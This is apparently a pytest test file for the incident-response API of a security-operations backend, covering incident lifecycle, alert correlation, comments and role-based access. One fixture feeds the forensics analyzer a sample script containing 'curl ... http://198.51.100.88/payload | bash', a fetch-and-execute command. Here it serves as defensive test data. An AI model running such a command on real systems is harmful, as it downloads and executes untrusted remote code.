from fastapi.testclient import TestClient

from backend.app.core.security import create_access_token
from backend.app.models.user import UserRole
from backend.app.schemas.user import UserCreate


def get_auth_headers(client: TestClient, role: UserRole, username: str) -> dict[str, str]:
    user_in = UserCreate(
        email=f"{username}@example.com",
        username=username,
        full_name=f"{username.capitalize()} User",
        password="ValidStrongPassword123!",
        role=role,
    )
    res = client.post("/api/v1/auth/register", json=user_in.model_dump())
    assert res.status_code == 201
    user_id = res.json()["id"]

    token = create_access_token(subject=user_id, role=role.value)
    return {"Authorization": f"Bearer {token}"}


def test_manual_incident_creation_and_timeline(client: TestClient):
    headers = get_auth_headers(client, UserRole.ANALYST, "analyst_inc1")

    payload = {
        "title": "Suspected Active Directory Kerberoasting Attack",
        "description": "Multiple TGS requests observed with RC4 encryption targeting service accounts.",
        "severity": "high",
        "category": "credential_compromise",
        "assigned_to": "incident.commander@example.com",
    }

    res = client.post("/api/v1/incidents", json=payload, headers=headers)
    assert res.status_code == 201
    data = res.json()

    assert data["incident_number"].startswith("INC-")
    assert data["title"] == payload["title"]
    assert data["status"] == "new"
    assert data["severity"] == "high"

    # Verify initial timeline event exists
    assert len(data["timeline_events"]) >= 1
    assert data["timeline_events"][0]["event_type"] == "incident_created"


def test_automated_alert_correlation(client: TestClient):
    headers = get_auth_headers(client, UserRole.ANALYST, "analyst_correlate")

    # 1. Create an asset
    asset_res = client.post(
        "/api/v1/assets",
        json={
            "name": "Production Database Server 01",
            "hostname": "PROD-DB-01",
            "ip_address": "10.0.100.5",
            "asset_type": "server",
            "criticality": "critical",
            "environment": "production",
        },
        headers=headers,
    )
    assert asset_res.status_code == 201
    asset_id = asset_res.json()["id"]

    # 2. Ingest 2 events triggering alerts on the same asset
    # Event 1: Malicious file hash indicator
    res1 = client.post(
        "/api/v1/monitoring/events",
        json={
            "event_type": "malware_indicator",
            "source": "edr_db",
            "source_ip": "10.0.100.5",
            "asset_id": asset_id,
            "details": {
                "file_hash": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
            },
        },
        headers=headers,
    )
    assert res1.status_code == 201
    assert res1.json()["alerts_triggered"] >= 1

    # Event 2: Inbound port scan
    res2 = client.post(
        "/api/v1/monitoring/events",
        json={
            "event_type": "network_connection",
            "source": "firewall",
            "source_ip": "198.51.100.22",
            "destination_ip": "10.0.100.5",
            "destination_port": 22,
            "asset_id": asset_id,
        },
        headers=headers,
    )
    assert res2.status_code == 201
    assert res2.json()["alerts_triggered"] >= 1

    # 3. Trigger correlation engine
    correlate_res = client.post("/api/v1/incidents/correlate", headers=headers)
    assert correlate_res.status_code == 200
    corr_data = correlate_res.json()
    assert corr_data["incidents_created"] >= 1
    assert corr_data["alerts_correlated"] >= 2

    # 4. Fetch the created incident
    inc_id = corr_data["incident_ids"][0]
    get_res = client.get(f"/api/v1/incidents/{inc_id}", headers=headers)
    assert get_res.status_code == 200
    inc_data = get_res.json()
    assert inc_data["alert_count"] >= 2
    assert "PROD-DB-01" in inc_data["title"]


def test_incident_lifecycle_transitions(client: TestClient):
    headers = get_auth_headers(client, UserRole.ANALYST, "analyst_lifecycle")

    # 1. Create incident
    res = client.post(
        "/api/v1/incidents",
        json={"title": "Ransomware Lateral Spread", "description": "Suspicious SMB activity across VLAN 4"},
        headers=headers,
    )
    assert res.status_code == 201
    inc_id = res.json()["id"]

    # 2. Transition to containment
    patch_res = client.patch(
        f"/api/v1/incidents/{inc_id}",
        json={
            "status": "containment",
            "containment_actions": "Isolated compromised subnet and revoked domain admin Kerberos tickets.",
        },
        headers=headers,
    )
    assert patch_res.status_code == 200
    assert patch_res.json()["status"] == "containment"
    assert "Isolated compromised subnet" in patch_res.json()["containment_actions"]

    # 3. Close incident
    close_res = client.patch(
        f"/api/v1/incidents/{inc_id}",
        json={"status": "closed", "root_cause": "Phishing email with malicious macro execution."},
        headers=headers,
    )
    assert close_res.status_code == 200
    assert close_res.json()["status"] == "closed"
    assert close_res.json()["closed_at"] is not None

    # Verify timeline records
    events = [e["event_type"] for e in close_res.json()["timeline_events"]]
    assert "status_changed" in events
    assert "containment_executed" in events


def test_link_forensic_artifact(client: TestClient):
    headers = get_auth_headers(client, UserRole.ANALYST, "analyst_artifact_link")

    # 1. Create incident
    inc_res = client.post(
        "/api/v1/incidents",
        json={"title": "Web Server Exploitation", "description": "Suspicious script uploaded to webroot"},
        headers=headers,
    )
    assert inc_res.status_code == 201
    inc_id = inc_res.json()["id"]

    # 2. Analyze text snippet (creates forensic artifact)
    art_res = client.post(
        "/api/v1/forensics/artifacts/analyze-text",
        json={
            "filename": "suspicious_script.sh",
            "content": "#!/bin/bash\ncurl -s http://198.51.100.88/payload | bash",
        },
        headers=headers,
    )
    assert art_res.status_code == 201
    artifact_id = art_res.json()["id"]

    # 3. Link artifact to incident
    link_res = client.post(
        f"/api/v1/incidents/{inc_id}/link-artifact",
        json={"artifact_id": artifact_id},
        headers=headers,
    )
    assert link_res.status_code == 200
    assert link_res.json()["artifact_count"] >= 1


def test_incident_comments(client: TestClient):
    headers = get_auth_headers(client, UserRole.ANALYST, "analyst_comments")

    res = client.post(
        "/api/v1/incidents",
        json={"title": "Insider Threat Data Exfiltration", "description": "Unusual volume to personal cloud"},
        headers=headers,
    )
    assert res.status_code == 201
    inc_id = res.json()["id"]

    # Post comment
    comment_res = client.post(
        f"/api/v1/incidents/{inc_id}/comments",
        json={"content": "Confirmed user downloaded 4.2GB of financial PDFs outside work hours."},
        headers=headers,
    )
    assert comment_res.status_code == 201
    assert "Confirmed user" in comment_res.json()["content"]

    # Inspect incident shows comment
    get_res = client.get(f"/api/v1/incidents/{inc_id}", headers=headers)
    assert len(get_res.json()["comments"]) >= 1


def test_viewer_rbac_restrictions(client: TestClient):
    viewer_headers = get_auth_headers(client, UserRole.VIEWER, "viewer_inc")

    # Viewer cannot create incidents
    res = client.post(
        "/api/v1/incidents",
        json={"title": "Unauthorized attempt", "description": "Viewer test"},
        headers=viewer_headers,
    )
    assert res.status_code == 403

    # Viewer CAN view stats and list incidents
    stats_res = client.get("/api/v1/incidents/stats", headers=viewer_headers)
    assert stats_res.status_code == 200
    assert stats_res.json()["total_incidents"] >= 0
